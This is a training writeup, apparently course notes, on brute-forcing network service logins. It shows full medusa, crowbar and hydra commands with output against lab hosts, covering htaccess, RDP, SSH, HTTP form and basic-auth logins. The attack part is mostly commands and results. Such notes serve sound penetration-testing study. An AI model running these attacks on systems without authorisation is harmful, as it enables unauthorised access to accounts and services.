---
description: >-
  Network Service Attack Methods
title:  Network Service Attack Methods              # Add title here
date: 2022-11-12 08:00:00 -0600                           # Change the date to match completion date
categories: [11 Password Attacks,  Network Service Attack Methods]                     # Change Templates to Writeup
tags: [password attacks, hydra, medusa, crowbar, network service attack methods]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### HTTP htaccess Attack with Medusa

We will attempt to gain access to an htaccess-protected folder, /admin, on that server.

Next, we will launch medusa and initiate the attack against the htaccess-protected URL (-m DIR:/admin) on our target host with -h 10.11.0.22. We will attack the admin user (-u admin) with passwords from our rockyou wordlist file (-P /usr/share/wordlists/rockyou.txt and will, of course, use an HTTP authentication scheme (-M):
```bash
kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456 (1 of 14344391 com
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 12345 (2 of 14344391 comp
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456789 (3 of 14344391 
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: password (4 of 14344391 c
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: iloveyou (5 of 14344391 c
...
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: samsung (255 of 14344391 
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: freedom (256 of 14344391 
ACCOUNT FOUND: [http] Host: 10.11.0.22 User: admin Password: freedom [SUCCESS]
...
```

This tool can interact with a variety of network protocols, which can be displayed with the -d option as shown below.

```bash
kali@kali:~$ medusa -d
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

  Available modules in "." :

  Available modules in "/usr/lib/medusa/modules" :
    + cvs.mod : Brute force module for CVS sessions : version 2.0
    + ftp.mod : Brute force module for FTP/FTPS sessions : version 2.1
    + http.mod : Brute force module for HTTP : version 2.1
    + imap.mod : Brute force module for IMAP sessions : version 2.0
    + mssql.mod : Brute force module for M$-SQL sessions : version 2.0
    + mysql.mod : Brute force module for MySQL sessions : version 2.0
...
```

### Remote Desktop Protocol Attack with Crowbar

Crowbar is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords. It is also one of the few tools that can reliably and efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service on modern versions of Windows.

To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), a wordlist (-C), and the number of threads (-n) as shown in Listing 16:

```bash
kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
2019-08-16 04:51:12 START
2019-08-16 04:51:12 Crowbar v0.3.5-dev
2019-08-16 04:51:12 Trying 10.11.0.22:3389
2019-08-16 04:51:13 RDP-SUCCESS : 10.11.0.22:3389 - admin:Offsec!
2019-08-16 04:51:13 STOP
```

### SSH Attack with THC-Hydra
THC-Hydra is another powerful network service attack tool under active development and it is worth mastering. We can use it to attack a variety of protocol authentication schemes, including SSH and HTTP.

The standard options include -l to specify the target username, -P to specify a wordlist, and protocol://IP to specify the target protocol and IP address respectively.

```bash
kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret servic

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 08:35:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommende
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:143443
[DATA] attacking ssh://127.0.0.1:22/
[22][ssh] host: 127.0.0.1   login: kali   password: whatever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 08:36:13
```

### HTTP POST Attack with THC-Hydra

When an HTTP POST request is used for user login, it is most often through the use of a web form, which means we should use the "http-form-post" service module. We can supply the service name followed by -U to obtain additional information about the required arguments:

```bash
kali@kali:~$ hydra http-form-post -U
...
Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

```

The complete command can now be executed. We will supply the admin user name (-l admin) and wordlist (-P), request verbose output with -vV, and use -f to stop the attack when the first successful result is found. In addition, we will supply the service module name (http-form-post) and its required arguments ("/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN") as shown below.

```bash
kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

Basic Authentication bruteforce.
```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.201.52 http-get /
```